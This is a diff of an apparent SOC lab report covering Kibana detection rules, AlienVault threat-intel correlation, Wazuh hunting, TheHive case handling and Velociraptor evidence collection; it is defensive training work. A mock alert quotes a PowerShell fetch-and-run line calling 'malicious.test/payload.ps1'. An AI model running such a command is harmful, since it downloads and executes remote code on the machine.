@@ -550,6 +550,7 @@ Go to:
 Kibana → Security → Rules → Create Rule
 Choose:
 •	Custom Query Rule 
+<img width="1352" height="638" alt="Screenshot (106)" src="https://github.com/user-attachments/assets/4a77c5ca-4db4-4315-a160-3ceb12bf8cea" />
 
 ________________________________________
 Step 2: Rule Configuration
@@ -558,11 +559,16 @@ network.bytes_out > 1000000
 Conditions:
 •	Time window: 1 minute 
 •	Threshold: > 1MB 
+<img width="1360" height="651" alt="Screenshot (107)" src="https://github.com/user-attachments/assets/6d74fad5-da33-4867-a1c2-2c2c81b3ba82" />
+
 ________________________________________
 Step 3: Rule Settings
 •	Rule Name: High Data Transfer Detection 
 •	Severity: High 
 •	Risk Score: 80 
+
+<img width="1359" height="639" alt="Screenshot (108)" src="https://github.com/user-attachments/assets/f692b8b3-b138-4ef9-bf6a-2e88414d4a89" />
+
 ________________________________________
 
 PART 5: LOG ENRICHMENT (GeoIP)
@@ -604,38 +610,39 @@ Activities:
 Tasks: Import threat feeds, enrich alerts, and hunt for threats.
 
 Enhanced Tasks:
- 
+ <img width="1331" height="693" alt="Screenshot (109)" src="https://github.com/user-attachments/assets/e290fae8-5746-4bbd-8bfc-17639b6298e0" />
+
 Download malicious domains data from the AlienVault.
  
  
-Convert data to the json format.
+Convert data to the json format and Upload JSON data to the Elasticsearch
  
- 
+ <img width="1091" height="600" alt="Screenshot (114)" src="https://github.com/user-attachments/assets/ded221ce-7e18-4b3b-9fbf-dcab89242ae8" />
 
-Upload JSON data to the Elasticsearch
-.
- 
-
-
- 
+<img width="1064" height="606" alt="Screenshot (115)" src="https://github.com/user-attachments/assets/e4fa667d-9a34-4a72-a469-fae606c040ea" />
 
 Verify the data uploaded successfully
 
 Create Correlation Rule:
- 
+ <img width="1075" height="568" alt="Screenshot (116)" src="https://github.com/user-attachments/assets/b679f0a1-aca6-42b0-9a8e-8094fd13ac6a" />
+
 Rule created for the malicious IP from AlienVault feed.
- 
+ <img width="1073" height="550" alt="Screenshot (117)" src="https://github.com/user-attachments/assets/f5c6fae8-5478-4a10-b2d9-c485125c1cb3" />
+
 The rule trigger for c2 malicious IP.
- 
+ <img width="1084" height="558" alt="Screenshot (118)" src="https://github.com/user-attachments/assets/bfa56ff3-b02e-461d-8161-5e5fb0a30ee8" />
+
 
 Alert ID	IP	Reputation	Notes
 001	185.244.172.155	Malicious (OTX)	Matched with DarkComet Command and Control in threat-intel index. Triggered rule “Threat Intel Match – C2”.
 
 
- 
+ <img width="1081" height="583" alt="Screenshot (119)" src="https://github.com/user-attachments/assets/bf8c63db-7205-49a6-9888-d1c395a55861" />
+
 It show that 12 successful login are recorded.
 
- 
+ <img width="1065" height="593" alt="Screenshot (120)" src="https://github.com/user-attachments/assets/97164f6b-a72f-49c3-93b7-defec9f85108" />
+
 
 You’ve found 12 valid logons that weren’t system-generated — these could be normal user logons.
 
@@ -650,72 +657,89 @@ The Wazuh hunt for MITRE T1078 (Valid Accounts) using query data.win.system.even
 Activities:
 Tasks: Simulate escalation, draft SITREPs, and automate workflows.
 Create a TheHive case for a High-priority alert (e.g., unauthorized access):
- 
- 
+ <img width="1248" height="671" alt="Screenshot (121)" src="https://github.com/user-attachments/assets/16838133-365f-4f82-bbab-feec77123fa0" />
+
+ <img width="1245" height="670" alt="Screenshot (122)" src="https://github.com/user-attachments/assets/63675845-5c0f-448a-b664-1ed088a0c7e9" />
+
+<img width="1139" height="613" alt="Screenshot (123)" src="https://github.com/user-attachments/assets/115498af-d921-4899-a697-edf099446582" />
  
 All task added successfully in the case.
 
 SITREP Draft: Write a Situation Report in Google Docs for a mock incident
 
 Unauthorized Access on Server-Y
-Section	Details
-Summary	Detected at 2025-08-18 13:00, IP: 192.168.1.200, MITRE T1078
-Actions Taken	Isolated server, escalated to Tier 2
-Next Steps	Tier 2 investigation, log review, user verification
-Prepared By	SOC Analyst
-Date	2025-08-18
+
+Section									Details
+Summary									Detected at 2025-08-18 13:00, IP: 192.168.1.200, MITRE T1078
+Actions Taken							Isolated server, escalated to Tier 2
+Next Steps								Tier 2 investigation, log review, user verification
+Prepared By								SOC Analyst
+Date									2025-08-18
 
 
 4. Alert Triage with Threat Intelligence
 Activities:
 Tasks: Triage alerts and validate IOCs using threat intelligence.
 
- 
+ <img width="1464" height="355" alt="Screenshot (124)" src="https://github.com/user-attachments/assets/b0df7f25-1d5a-42f8-b3ba-a1c4c7c1a2af" />
+
 
 Mock alert creation Suspicious PowerShell Execution 
  
- 
+ <img width="1338" height="675" alt="Screenshot (125)" src="https://github.com/user-attachments/assets/ee56c1f1-0738-4fb1-bf2b-9911c9211fe5" />
+
+<img width="1086" height="586" alt="Screenshot (126)" src="https://github.com/user-attachments/assets/5d86aad1-2755-42df-9750-1683808eb0e9" />
 
 Alert successfully show in Wazuh.
 
-Alert ID	Description	Source IP	Priority	Status
-004 / 91837	PowerShell ScriptBlock execution (EventID 4104) — IEX ...DownloadString('http://malicious.test/payload.ps1')	192.168.0.128	Medium (Wazuh level 4 → escalate if external)	Open
+Alert ID		Description									Priority	Status
+004 / 91837		PowerShell ScriptBlock execution (EventID 4104) — IEX ...DownloadString('http://malicious.test/payload.ps1')	192.168.0.128	Medium (Wazuh level 4 → escalate if external)	Open
 
 IOC validation :
 	Indicator Investigated: 192.168.0.128
 	Sources Used : Virus Total and AlienVault
  
+<img width="1086" height="535" alt="Screenshot (127)" src="https://github.com/user-attachments/assets/af3f6abf-3d51-4c36-854f-3dd4d19ff6fe" />
  
+<img width="1092" height="585" alt="Screenshot (128)" src="https://github.com/user-attachments/assets/ec6f4ddb-a456-4fbd-9680-92e515922246" />
 
 Result:
+
 •	VirusTotal: No malicious detections (0/95 engines flagged).
+
 •	AlienVault OTX: No active pulses or threat associations.
+
 •	Conclusion: Internal IP (likely a lab endpoint). No known malicious reputation.
 
 Summary:
+
 The alert indicated a suspicious PowerShell execution involving a potential IEX DownloadString command. IOC analysis of IP 192.168.0.128 on VirusTotal and AlienVault OTX returned no known malicious activity. The IP appears to belong to an internal test machine, suggesting a benign event within the controlled lab environment.
 
 
 5. Evidence Preservation and Analysis
-Activities:
+
 Tasks: Collect and preserve evidence, maintain chain-of-custody.
 
 Volatile Data Collection:
 	Use Velociraptor to collect network connections
  
- 
+ <img width="1096" height="527" alt="Screenshot (129)" src="https://github.com/user-attachments/assets/51783cdf-fb1c-4c31-8a52-b1c0b1b33f9f" />
+
+<img width="1103" height="496" alt="Screenshot (130)" src="https://github.com/user-attachments/assets/17a38719-b18b-4e0f-a268-ea3162f53741" />
 
 We successfully collected network connections from windows VM and saved it to the .csv file.
+<img width="1389" height="268" alt="Screenshot (131)" src="https://github.com/user-attachments/assets/68715e23-6587-4457-bba5-3cd04e0ba2fa" />
+
  
 Collect a memory dump:
  	SELECT * FROM Artifact.Windows.Memory.Acquisition
- 
- 
+ <img width="1395" height="572" alt="Screenshot (132)" src="https://github.com/user-attachments/assets/d25bca66-2a45-4b80-87a1-ebd85d5ae9fc" />
+
+ <img width="1310" height="598" alt="Screenshot (133)" src="https://github.com/user-attachments/assets/20a9802e-72ae-48f7-99aa-7960d448658e" />
+
 We successfully collected memory dump from windows VM.
  
-
-
-
+<img width="1286" height="404" alt="Screenshot (134)" src="https://github.com/user-attachments/assets/42b10f49-56ca-4b7e-a028-7ba8f7cfca0e" />
 
 
 
